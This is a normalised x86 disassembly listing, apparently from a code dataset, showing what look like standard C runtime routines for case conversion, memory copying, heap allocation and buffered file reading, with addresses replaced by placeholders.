cmp ecx 0x19
ja r-xdata
mov [ ebp - 0x8 ] eax
test edi edi
jne r-xdata
test esi esi
jne r-xdata
test esi esi
jne r-xdata
pop edi
pop esi
leave
retn
add eax 0x20
jmp r-xdata
mov eax [ esi + 0x4 ]
mov edx ebx
sar edx 0x8
movzx ecx dl
movsx eax [ eax + ecx * 2 ]
shr eax 0xf
and eax 0x1
mov eax ebx
sar eax 0x8
mov [ ebp - 0xc ] eax
call sub_41b087
mov edx [ ebp - 0xc ]
movzx ecx dl
movzx eax [ eax + ecx * 2 ]
and eax 0x8000
jmp r-xdata
mov eax [ esi + 0x4 ]
test [ eax + ebx * 2 ] 0x1
je r-xdata
push ebx
call sub_41b1f6
pop ecx
test eax eax
jne r-xdata
xor eax eax
mov [ ebp + 0xc ] bl
mov [ ebp + 0xd ] 0x0
inc eax
push 0x2
mov [ ebp + 0xc ] dl
mov [ ebp + 0xd ] bl
mov [ ebp + 0xe ] 0x0
pop eax
jmp r-xdata
test eax eax
je r-xdata
mov eax ebx
jmp r-xdata
jmp r-xdata
cmp eax 0x1
movzx eax [ ebp - 0x4 ]
je r-xdata
push 0x1
push [ ebp - 0x8 ]
lea ecx [ ebp - 0x4 ]
push 0x3
push ecx
push eax
lea eax [ ebp + 0xc ]
push eax
push 0x100
push edi
push 0x0
call sub_41b843
add esp 0x24
test eax eax
jne r-xdata
pop ebx
movzx ecx [ ebp - 0x3 ]
shl eax 0x8
or eax ecx
sub_416db6
push ebp
mov ebp esp
sub esp 0xc
push esi
mov esi [ ebp + 0xc ]
push edi
test esi esi
jne r-xdata
mov edi [ esi + 0xc ]
mov eax [ esi ]
call sub_41b29a
mov edi [ eax + 0x8 ]
call sub_41b274
jmp r-xdata
push ebx
mov ebx [ ebp + 0x8 ]
cmp ebx 0x100
jae r-xdata
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x61 ]
cmp ecx 0x19
ja r-xdata
mov [ ebp - 0x8 ] eax
test edi edi
jne r-xdata
test esi esi
jne r-xdata
test esi esi
jne r-xdata
pop edi
pop esi
leave
retn
sub eax 0x20
jmp r-xdata
mov eax [ esi + 0x4 ]
mov edx ebx
sar edx 0x8
movzx ecx dl
movsx eax [ eax + ecx * 2 ]
shr eax 0xf
and eax 0x1
mov eax ebx
sar eax 0x8
mov [ ebp - 0xc ] eax
call sub_41b087
mov edx [ ebp - 0xc ]
movzx ecx dl
movzx eax [ eax + ecx * 2 ]
and eax 0x8000
jmp r-xdata
mov eax [ esi + 0x4 ]
test [ eax + ebx * 2 ] 0x2
je r-xdata
push ebx
call sub_41b1cb
pop ecx
test eax eax
jne r-xdata
xor eax eax
mov [ ebp + 0xc ] bl
mov [ ebp + 0xd ] 0x0
inc eax
push 0x2
mov [ ebp + 0xc ] dl
mov [ ebp + 0xd ] bl
mov [ ebp + 0xe ] 0x0
pop eax
jmp r-xdata
test eax eax
je r-xdata
mov eax ebx
jmp r-xdata
jmp r-xdata
cmp eax 0x1
movzx eax [ ebp - 0x4 ]
je r-xdata
push 0x1
push [ ebp - 0x8 ]
lea ecx [ ebp - 0x4 ]
push 0x3
push ecx
push eax
lea eax [ ebp + 0xc ]
push eax
push 0x200
push edi
push 0x0
call sub_41b843
add esp 0x24
test eax eax
jne r-xdata
pop ebx
movzx ecx [ ebp - 0x3 ]
shl eax 0x8
or eax ecx
sub_416eb3
push ebp
mov ebp esp
push esi
push edi
mov edi ecx
mov esi [ edi + 0x2c ]
jmp r-xdata
test esi esi
jne r-xdata
push [ esi + 0x4 ]
push edi
push [ ebp + 0x8 ]
call [ esi + 0x8 ]
mov esi [ esi ]
add esp 0xc
pop edi
pop esi
pop ebp
retn 0x4
sub_416ed8
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
mov ecx esi
call sub_416f15
mov esi [ esi + 0x30 ]
test esi esi
je r-xdata
dec [ eax + rw-data ]
mov al [ eax + rw-data ]
test al al
jg r-xdata
pop esi
pop ebp
retn
mov ecx esi
call sub_408b10
push esi
call j_sub_417912#2
pop ecx
sub_416f15
push esi
push edi
push 0x0
mov edi ecx
call sub_416eb3
mov eax [ edi + 0x28 ]
test eax eax
je r-xdata
mov eax [ edi + 0x2c ]
and [ edi + 0x28 ] 0x0
test eax eax
je r-xdata
mov esi [ eax ]
push eax
call j_sub_417912#2
pop ecx
mov eax esi
test esi esi
jne r-xdata
and [ edi + 0x2c ] 0x0
pop edi
pop esi
retn
mov esi [ eax ]
push eax
call j_sub_417912#2
pop ecx
mov eax esi
test esi esi
jne r-xdata
sub_416f57
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push esi
push edi
xor ecx ecx
mov edi eax
mov edx eax
and edi 0x4
and edx 0x80
inc ecx
test al 0x40
je r-xdata
test al 0x8
je r-xdata
or eax ecx
and eax 0xffffff3b
xor esi esi
or eax 0x2
cmp [ esi * 4 + r--data ] 0x0
jne r-xdata
mov ecx [ esi * 4 + r--data ]
inc esi
test ecx ecx
jne r-xdata
test edx edx
je r-xdata
xor eax eax
jmp r-xdata
cmp ecx eax
je r-xdata
push [ ebp + 0x10 ]
push esi
push [ ebp + 0x8 ]
call sub_417002
mov esi eax
add esp 0xc
test esi esi
je r-xdata
test al 0xa
je r-xdata
pop edi
pop esi
pop ebp
retn
test edi edi
je r-xdata
push [ ebp + 0x10 ]
push 0x0
push [ ebp + 0x8 ]
call sub_417002
add esp 0xc
test eax eax
je r-xdata
mov eax esi
push 0x2
push 0x0
push esi
call sub_4183cf
add esp 0xc
test eax eax
je r-xdata
push eax
push esi
jmp r-xdata
call sub_4184ba
pop ecx
jmp r-xdata
sub_417065
jmp r-xdata
mov ecx [ rw-data ]
cmp ecx 0xa
jb r-xdata
mov eax [ ecx * 4 + rw-data ]
inc ecx
push eax
mov [ rw-data ] ecx
call [ DecodePointer@IAT ]
test eax eax
je r-xdata
retn
call eax
sub_41708e
push ebp
mov ebp esp
mov eax [ rw-data ]
test eax eax
je sub_41ca9b
push [ ebp + 0x8 ]
dec eax
mov [ rw-data ] eax
call [ EncodePointer@IAT ]
mov ecx [ rw-data ]
mov [ ecx * 4 + rw-data ] eax
pop ebp
retn
sub_4170d0
push edi
push esi
mov esi [ esp + 0x10 ]
mov ecx [ esp + 0x14 ]
mov edi [ esp + 0xc ]
mov eax ecx
mov edx ecx
add eax esi
cmp edi esi
jbe r-xdata
bt [ rw-data ] 0x1
jae r-xdata
cmp edi eax
jb r-xdata
cmp ecx 0x80
jb r-xdata
[ edi ] [ esi ]
jmp r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
test edi 0x3
jne r-xdata
test edi 0x3
jne r-xdata
mov eax edi
xor eax esi
test eax 0xf
jne r-xdata
mov eax [ esp + 0xc ]
pop esi
pop edi
retn
mov eax edi
mov edx 0x3
cmp ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
mov eax edi
mov edx 0x3
sub ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
bt [ rw-data ] 0x0
jae r-xdata
bt [ rw-data ] 0x1
jb r-xdata
jmp [ ecx * 4 + jump_table_4175a4 ]
and eax 0x3
sub ecx eax
jmp [ eax * 4 + jump_table_4174a8 ]
neg ecx
jmp [ ecx * 4 + r-xdata ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_4175a4 ]
jmp [ ecx * 4 + r-xdata ]
and eax 0x3
add ecx eax
jmp [ eax * 4 + jump_table_41731c ]
jmp [ ecx * 4 + jump_table_41739c ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_417408 ]
test edi 0x3
jne r-xdata
push edi
mov eax esi
and eax 0xf
test eax eax
jne r-xdata
mov eax [ esp + 0xc ]
pop esi
pop edi
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov eax [ esp + 0xc ]
pop esi
pop edi
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ esp + 0xc ]
pop esi
pop edi
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ esp + 0xc ]
pop esi
pop edi
retn
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
sub esi 0x1
shr ecx 0x2
sub edi 0x1
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
sub esi 0x2
sub edi 0x2
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
sub esi 0x3
sub edi 0x3
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 + 0x1c ]
mov [ edi + ecx * 4 + 0x1c ] eax
mov eax [ esi + ecx * 4 + 0x18 ]
mov [ edi + ecx * 4 + 0x18 ] eax
mov eax [ esi + ecx * 4 + 0x14 ]
mov [ edi + ecx * 4 + 0x14 ] eax
mov eax [ esi + ecx * 4 + 0x10 ]
mov [ edi + ecx * 4 + 0x10 ] eax
mov eax [ esi + ecx * 4 + 0xc ]
mov [ edi + ecx * 4 + 0xc ] eax
mov eax [ esi + ecx * 4 + 0x8 ]
mov [ edi + ecx * 4 + 0x8 ] eax
mov eax [ esi + ecx * 4 + 0x4 ]
mov [ edi + ecx * 4 + 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_4175a4 ]
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
add esi 0x3
add edi 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
add esi 0x2
add edi 0x2
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
add esi 0x1
shr ecx 0x2
add edi 0x1
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 - 0x1c ]
mov [ edi + ecx * 4 - 0x1c ] eax
mov eax [ esi + ecx * 4 - 0x18 ]
mov [ edi + ecx * 4 - 0x18 ] eax
mov eax [ esi + ecx * 4 - 0x14 ]
mov [ edi + ecx * 4 - 0x14 ] eax
mov eax [ esi + ecx * 4 - 0x10 ]
mov [ edi + ecx * 4 - 0x10 ] eax
mov eax [ esi + ecx * 4 - 0xc ]
mov [ edi + ecx * 4 - 0xc ] eax
mov eax [ esi + ecx * 4 - 0x8 ]
mov [ edi + ecx * 4 - 0x8 ] eax
mov eax [ esi + ecx * 4 - 0x4 ]
mov [ edi + ecx * 4 - 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_417408 ]
mov al [ esi ]
mov [ edi ] al
mov eax [ esp + 0xc ]
pop esi
pop edi
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ esp + 0xc ]
pop esi
pop edi
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ esp + 0xc ]
pop esi
pop edi
retn
test esi 0x3
jne r-xdata
mov edx 0x10
sub edx eax
sub ecx edx
push ecx
mov eax edx
mov ecx eax
and ecx 0x3
je r-xdata
mov edx ecx
and ecx 0x7f
shr edx 0x7
je r-xdata
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_4175a4 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_4175a4 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_4175a4 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_417408 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_417408 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_417408 ]
bt edi 0x2
jae r-xdata
shr eax 0x2
je r-xdata
mov dl [ esi ]
mov [ edi ] dl
inc esi
inc edi
dec ecx
jne r-xdata
test ecx ecx
je r-xdata
lea esp [ esp ]
nop
bt edi 0x3
jae r-xdata
mov eax [ esi ]
sub ecx 0x4
lea esi [ esi + 0x4 ]
mov [ edi ] eax
lea edi [ edi + 0x4 ]
pop ecx
jmp r-xdata
mov edx [ esi ]
mov [ edi ] edx
lea esi [ esi + 0x4 ]
lea edi [ edi + 0x4 ]
dec eax
jne r-xdata
pop eax
pop esi
pop edi
retn
mov edx ecx
shr edx 0x4
test edx edx
je r-xdata
movdqa xmm0 [ esi ]
movdqa xmm1 [ esi + 0x10 ]
movdqa xmm2 [ esi + 0x20 ]
movdqa xmm3 [ esi + 0x30 ]
movdqa [ edi ] xmm0
movdqa [ edi + 0x10 ] xmm1
movdqa [ edi + 0x20 ] xmm2
movdqa [ edi + 0x30 ] xmm3
movdqa xmm4 [ esi + 0x40 ]
movdqa xmm5 [ esi + 0x50 ]
movdqa xmm6 [ esi + 0x60 ]
movdqa xmm7 [ esi + 0x70 ]
movdqa [ edi + 0x40 ] xmm4
movdqa [ edi + 0x50 ] xmm5
movdqa [ edi + 0x60 ] xmm6
movdqa [ edi + 0x70 ] xmm7
lea esi [ esi + 0x80 ]
lea edi [ edi + 0x80 ]
dec edx
jne r-xdata
test esi 0x7
je r-xdata
movq xmm1 [ esi ]
sub ecx 0x8
lea esi [ esi + 0x8 ]
movq [ edi ] xmm1
lea edi [ edi + 0x8 ]
and ecx 0xf
je r-xdata
lea ebx [ ebx ]
movdqa xmm1 [ esi - 0x8 ]
lea esi [ esi - 0x8 ]
lea ecx [ ecx ]
bt esi 0x3
jae r-xdata
mov eax ecx
shr ecx 0x2
je r-xdata
movdqa xmm0 [ esi ]
movdqa [ edi ] xmm0
lea esi [ esi + 0x10 ]
lea edi [ edi + 0x10 ]
dec edx
jne r-xdata
movdqa xmm3 [ esi + 0x10 ]
sub ecx 0x30
movdqa xmm0 [ esi + 0x20 ]
movdqa xmm5 [ esi + 0x30 ]
lea esi [ esi + 0x30 ]
cmp ecx 0x30
movdqa xmm2 xmm3
palignr xmm3 xmm1 0x8
movdqa [ edi ] xmm3
movdqa xmm4 xmm0
palignr xmm0 xmm2 0x8
movdqa [ edi + 0x10 ] xmm0
movdqa xmm1 xmm5
palignr xmm5 xmm4 0x8
movdqa [ edi + 0x20 ] xmm5
lea edi [ edi + 0x30 ]
jge r-xdata
lea esi [ esi + 0x8 ]
jmp r-xdata
movdqa xmm1 [ esi - 0x4 ]
lea esi [ esi - 0x4 ]
mov edi edi
movdqa xmm1 [ esi - 0xc ]
lea esi [ esi - 0xc ]
mov ecx eax
and ecx 0x3
je r-xdata
mov edx [ esi ]
mov [ edi ] edx
lea esi [ esi + 0x4 ]
lea edi [ edi + 0x4 ]
dec ecx
jne r-xdata
cmp ecx 0x10
jl r-xdata
movdqa xmm3 [ esi + 0x10 ]
sub ecx 0x30
movdqa xmm0 [ esi + 0x20 ]
movdqa xmm5 [ esi + 0x30 ]
lea esi [ esi + 0x30 ]
cmp ecx 0x30
movdqa xmm2 xmm3
palignr xmm3 xmm1 0x4
movdqa [ edi ] xmm3
movdqa xmm4 xmm0
palignr xmm0 xmm2 0x4
movdqa [ edi + 0x10 ] xmm0
movdqa xmm1 xmm5
palignr xmm5 xmm4 0x4
movdqa [ edi + 0x20 ] xmm5
lea edi [ edi + 0x30 ]
jge r-xdata
lea esi [ esi + 0x4 ]
movdqa xmm3 [ esi + 0x10 ]
sub ecx 0x30
movdqa xmm0 [ esi + 0x20 ]
movdqa xmm5 [ esi + 0x30 ]
lea esi [ esi + 0x30 ]
cmp ecx 0x30
movdqa xmm2 xmm3
palignr xmm3 xmm1 0xc
movdqa [ edi ] xmm3
movdqa xmm4 xmm0
palignr xmm0 xmm2 0xc
movdqa [ edi + 0x10 ] xmm0
movdqa xmm1 xmm5
palignr xmm5 xmm4 0xc
movdqa [ edi + 0x20 ] xmm5
lea edi [ edi + 0x30 ]
jge r-xdata
lea esi [ esi + 0xc ]
jmp r-xdata
mov al [ esi ]
mov [ edi ] al
inc esi
inc edi
dec ecx
jne r-xdata
bt ecx 0x2
jae r-xdata
movdqu xmm1 [ esi ]
sub ecx 0x10
lea esi [ esi + 0x10 ]
movdqa [ edi ] xmm1
lea edi [ edi + 0x10 ]
jmp r-xdata
lea ebx [ ebx ]
bt ecx 0x3
jae r-xdata
mov eax [ esi ]
sub ecx 0x4
lea esi [ esi + 0x4 ]
mov [ edi ] eax
lea edi [ edi + 0x4 ]
mov eax [ ecx * 4 + jump_table_417408 ]
jmp eax
movq xmm1 [ esi ]
sub ecx 0x8
lea esi [ esi + 0x8 ]
movq [ edi ] xmm1
lea edi [ edi + 0x8 ]
sub_417722
push ebp
mov ebp esp
lea eax [ ecx + 0x9 ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0x9
push eax
call sub_41cb70
neg eax
pop ecx
sbb eax eax
pop ecx
inc eax
pop ebp
retn 0x4
sub_417740
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_417714
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call j_sub_417912#2
pop ecx
sub_41775f
push ebp
mov ebp esp
sub esp 0x10
jmp r-xdata
push [ ebp + 0x8 ]
call sub_41794a
pop ecx
test eax eax
je r-xdata
push [ ebp + 0x8 ]
call sub_41ec44
pop ecx
test eax eax
je r-xdata
leave
retn
push 0x1
lea eax [ ebp - 0x4 ]
push eax
lea ecx [ ebp - 0x10 ]
mov [ ebp - 0x4 ] r--data
call sub_418b33
push r--data
lea eax [ ebp - 0x10 ]
push eax
mov [ ebp - 0x10 ] r--data
call sub_41a87b
int3
sub_4177ae
push esi
push 0x4
push 0x20
call sub_41b887
pop ecx
pop ecx
mov esi eax
push esi
call [ EncodePointer@IAT ]
mov [ rw-data ] eax
mov [ rw-data ] eax
test esi esi
jne r-xdata
and [ esi ] 0x0
xor eax eax
pop esi
retn
push 0x18
pop eax
pop esi
retn
sub_4177dd
push 0xc
push r--data
call sub_41ecb0
call sub_41883f
and [ ebp - 0x4 ] 0x0
push [ ebp + 0x8 ]
call sub_41781d
pop ecx
mov esi eax
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_417817
mov eax esi
call sub_41ecf5
retn
sub_41781d
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi [ DecodePointer@IAT ]
push edi
push [ rw-data ]
call esi
push [ rw-data ]
mov [ ebp - 0x4 ] eax
call esi
mov ebx eax
mov eax [ ebp - 0x4 ]
cmp ebx eax
jb r-xdata
xor eax eax
mov edi ebx
sub edi eax
lea ecx [ edi + 0x4 ]
cmp ecx 0x4
jb r-xdata
push eax
call sub_41ec77
mov esi eax
lea eax [ edi + 0x4 ]
pop ecx
cmp esi eax
jae r-xdata
push [ ebp + 0x8 ]
call [ EncodePointer@IAT ]
lea ecx [ ebx + 0x4 ]
push ecx
mov [ ebx ] eax
call [ EncodePointer@IAT ]
mov [ rw-data ] eax
mov eax [ ebp + 0x8 ]
jmp r-xdata
mov eax 0x800
cmp esi eax
jae r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov ebx [ ebp - 0x4 ]
add eax esi
cmp eax esi
jb r-xdata
mov eax esi
lea eax [ esi + 0x10 ]
cmp eax esi
jb r-xdata
push eax
push ebx
call sub_41b91a
pop ecx
pop ecx
test eax eax
jne r-xdata
push eax
push ebx
call sub_41b91a
pop ecx
pop ecx
test eax eax
je r-xdata
sar edi 0x2
push eax
lea ebx [ eax + edi * 4 ]
call [ EncodePointer@IAT ]
mov [ rw-data ] eax
sub_417912
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
je r-xdata
pop ebp
retn
push [ ebp + 0x8 ]
push 0x0
push [ rw-data ]
call [ HeapFree@IAT ]
test eax eax
jne r-xdata
push esi
call sub_41ccf1
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_41cd04
pop ecx
mov [ esi ] eax
pop esi
sub_41794a
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
cmp esi 0xffffffe0
ja r-xdata
push esi
call sub_41ec44
pop ecx
call sub_41ccf1
mov [ eax ] 0xc
xor eax eax
push ebx
push edi
test esi esi
je r-xdata
call sub_41eea5
push 0x1e
call sub_41ef02
push 0xff
call sub_4186d4
xor ecx ecx
inc ecx
mov ecx esi
jmp r-xdata
mov eax edi
pop edi
pop ebx
jmp r-xdata
push 0xc
pop ebx
cmp [ rw-data ] eax
je r-xdata
push ecx
push 0x0
push eax
call [ HeapAlloc@IAT ]
mov edi eax
test edi edi
jne r-xdata
pop esi
pop ebp
retn
call sub_41ccf1
mov [ eax ] ebx
push esi
call sub_41ec44
pop ecx
test eax eax
jne r-xdata
mov eax [ rw-data ]
test eax eax
jne r-xdata
jmp r-xdata
call sub_41ccf1
mov [ eax ] ebx
sub_4179dc
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
test edi edi
je r-xdata
call sub_41ccf1
push 0x16
mov ecx [ ebp + 0xc ]
test ecx ecx
je r-xdata
mov edx [ ebp + 0x10 ]
test edx edx
jne r-xdata
mov esi edi
xor eax eax
mov [ edi ] ax
test ecx ecx
je r-xdata
add esi 0x2
dec ecx
jne r-xdata
sub esi edx
cmp [ esi ] 0x0
je r-xdata
xor eax eax
test ecx ecx
jne r-xdata
dec ecx
jne r-xdata
pop edi
pop esi
pop ebp
retn
mov [ edi ] ax
call sub_41ccf1
push 0x22
jmp r-xdata
movzx eax [ edx ]
mov [ esi + edx ] ax
lea edx [ edx + 0x2 ]
test ax ax
je r-xdata
pop esi
mov [ eax ] esi
call sub_41f411
mov eax esi
sub_417a48
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
call sub_41ccf1
push 0x16
mov edx [ ebp + 0xc ]
test edx edx
je r-xdata
mov ecx [ ebp + 0x10 ]
test ecx ecx
jne r-xdata
push edi
mov edi esi
sub edi ecx
xor eax eax
mov [ esi ] ax
xor eax eax
pop edi
test edx edx
jne r-xdata
dec edx
jne r-xdata
pop esi
pop ebp
retn
mov [ esi ] ax
call sub_41ccf1
push 0x22
jmp r-xdata
movzx eax [ ecx ]
mov [ edi + ecx ] ax
lea ecx [ ecx + 0x2 ]
test ax ax
je r-xdata
pop esi
mov [ eax ] esi
call sub_41f411
mov eax esi
sub_417aa4
push 0xc
push r--data
call sub_41ecb0
xor ecx ecx
mov [ ebp - 0x1c ] ecx
xor eax eax
mov edi [ ebp + 0x8 ]
test edi edi
setne al
test eax eax
jne r-xdata
xor eax eax
mov ebx [ ebp + 0xc ]
test ebx ebx
setne al
test eax eax
je r-xdata
call sub_41ccf1
mov [ eax ] 0x16
call sub_41f411
xor eax eax
cmp [ ebx ] cx
setne al
test eax eax
je r-xdata
call sub_41ecf5
retn
call sub_41f44c
mov esi eax
mov [ ebp + 0x8 ] esi
test esi esi
jne r-xdata
xor eax eax
mov [ ebp - 0x4 ] eax
cmp [ edi ] ax
jne r-xdata
call sub_41ccf1
mov [ eax ] 0x18
jmp r-xdata
push esi
push [ ebp + 0x10 ]
push ebx
push edi
call sub_41f564
add esp 0x10
mov edi eax
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_417b66
mov eax edi
call sub_41ccf1
mov [ eax ] 0x16
push 0xfffffffe
lea eax [ ebp - 0x10 ]
push eax
push rw-data
call sub_41f800
add esp 0xc
jmp r-xdata
xor eax eax
jmp r-xdata
sub_417b8f
push ebp
mov ebp esp
sub esp 0x10
cmp [ ebp + 0x10 ] 0x0
mov ecx [ ebp + 0x8 ]
mov eax [ ebp + 0xc ]
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] eax
je r-xdata
xor eax eax
mov ebx [ ebp + 0x14 ]
test ebx ebx
je r-xdata
test ecx ecx
jne r-xdata
mov esi [ ebp + 0x18 ]
test esi esi
je r-xdata
call sub_41ccf1
mov [ eax ] 0x16
cmp [ ebp + 0xc ] 0xffffffff
je r-xdata
or eax 0xffffffff
xor edx edx
div [ ebp + 0x10 ]
cmp ebx eax
jbe r-xdata
test esi esi
je r-xdata
push [ ebp + 0xc ]
push 0x0
push ecx
call sub_41cae0
add esp 0xc
mov edi [ ebp + 0x10 ]
imul edi ebx
test [ esi + 0xc ] 0x10c
mov ebx edi
je r-xdata
or eax 0xffffffff
xor edx edx
div [ ebp + 0x10 ]
cmp ebx eax
ja r-xdata
mov ecx 0x1000
mov ecx [ esi + 0x18 ]
jmp r-xdata
mov eax [ ebp + 0x14 ]
jmp r-xdata
test [ esi + 0xc ] 0x10c
je r-xdata
mov [ ebp - 0xc ] ecx
test edi edi
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
cmp ebx ecx
jb r-xdata
mov eax [ esi + 0x4 ]
mov [ ebp - 0x10 ] eax
test eax eax
je r-xdata
push esi
call sub_42082b
pop ecx
cmp eax 0xffffffff
je r-xdata
test ecx ecx
je r-xdata
js r-xdata
sub edi ebx
mov eax edi
xor edx edx
div [ ebp + 0x10 ]
jmp r-xdata
mov ecx [ ebp - 0x8 ]
test ecx ecx
je r-xdata
mov eax 0x7fffffff
cmp ebx 0x7fffffff
ja r-xdata
xor edx edx
cmp ebx 0x7fffffff
jbe r-xdata
or [ esi + 0xc ] 0x20
cmp ebx eax
jae r-xdata
cmp [ ebp + 0xc ] 0xffffffff
je r-xdata
mov edx [ ebp - 0x4 ]
mov [ edx ] al
inc edx
dec ebx
dec ecx
mov [ ebp - 0x8 ] ecx
mov ecx [ esi + 0x18 ]
mov [ ebp - 0x4 ] edx
mov [ ebp - 0xc ] ecx
cmp eax [ ebp - 0x8 ]
ja r-xdata
mov eax ebx
mov eax ebx
div ecx
mov eax ebx
mov eax 0x7fffffff
div ecx
mov eax 0x7fffffff
jmp r-xdata
mov ecx [ ebp - 0x8 ]
cmp eax ecx
ja r-xdata
mov eax ebx
mov [ ebp - 0x10 ] ebx
call sub_41ccf1
mov [ eax ] 0x22
jmp r-xdata
push [ ebp + 0xc ]
push 0x0
push [ ebp + 0x8 ]
call sub_41cae0
add esp 0xc
push eax
push [ ebp - 0x4 ]
push esi
call sub_42094c
pop ecx
push eax
call sub_420a78
add esp 0xc
test eax eax
je r-xdata
sub eax edx
jmp r-xdata
push eax
push [ esi ]
push ecx
push [ ebp - 0x4 ]
call sub_418c3b
mov eax [ ebp - 0x10 ]
sub [ esi + 0x4 ] eax
add esp 0x10
sub ebx eax
add [ esi ] eax
jmp r-xdata
call sub_41f411
or [ esi + 0xc ] 0x10
jmp r-xdata
cmp eax 0xffffffff
je r-xdata
add [ ebp - 0x4 ] eax
sub [ ebp - 0x8 ] eax
mov ecx [ ebp - 0xc ]
jmp r-xdata
sub ebx eax
test ebx ebx
jne r-xdata
sub_417d6d
push 0xc
push r--data
call sub_41ecb0
xor edi edi
mov [ ebp - 0x1c ] edi
cmp [ ebp + 0x10 ] edi
je r-xdata
xor eax eax
cmp [ ebp + 0x14 ] edi
je r-xdata
mov esi [ ebp + 0x18 ]
test esi esi
jne r-xdata
push esi
call sub_419288
pop ecx
mov [ ebp - 0x4 ] edi
push esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_417b8f
add esp 0x14
mov edi eax
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_417df6
mov eax edi
jmp r-xdata
cmp [ ebp + 0xc ] 0xffffffff
je r-xdata
call sub_41ecf5
retn
call sub_41ccf1
mov [ eax ] 0x16
call sub_41f411
push [ ebp + 0xc ]
push edi
push [ ebp + 0x8 ]
call sub_41cae0
add esp 0xc
sub_417dfe
push ebp
mov ebp esp
push ecx
push ecx
mov ecx [ ebp + 0xc ]
push ebx
push esi
push edi
test ecx ecx
je r-xdata
xor eax eax
mov ebx [ ebp + 0x10 ]
test ebx ebx
je r-xdata
mov esi [ ebp + 0x14 ]
test esi esi
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
call sub_41ccf1
mov [ eax ] 0x16
call sub_41f411
or eax 0xffffffff
xor edx edx
div ecx
cmp ebx eax
ja r-xdata
mov edi ecx
imul edi ebx
test [ esi + 0xc ] 0x10c
mov ebx edi
je r-xdata
mov ecx 0x1000
mov ecx [ esi + 0x18 ]
jmp r-xdata
mov eax [ ebp + 0x10 ]
jmp r-xdata
mov edx [ esi + 0xc ]
and edx 0x108
je r-xdata
mov [ ebp - 0x4 ] ecx
test edi edi
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
cmp ebx ecx
jb r-xdata
mov eax [ esi + 0x4 ]
mov [ ebp - 0x8 ] eax
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
push esi
movsx eax [ eax ]
push eax
call sub_41f952
pop ecx
pop ecx
cmp eax 0xffffffff
je r-xdata
test edx edx
je r-xdata
js r-xdata
sub edi ebx
mov eax edi
xor edx edx
div [ ebp + 0xc ]
jmp r-xdata
inc [ ebp + 0x8 ]
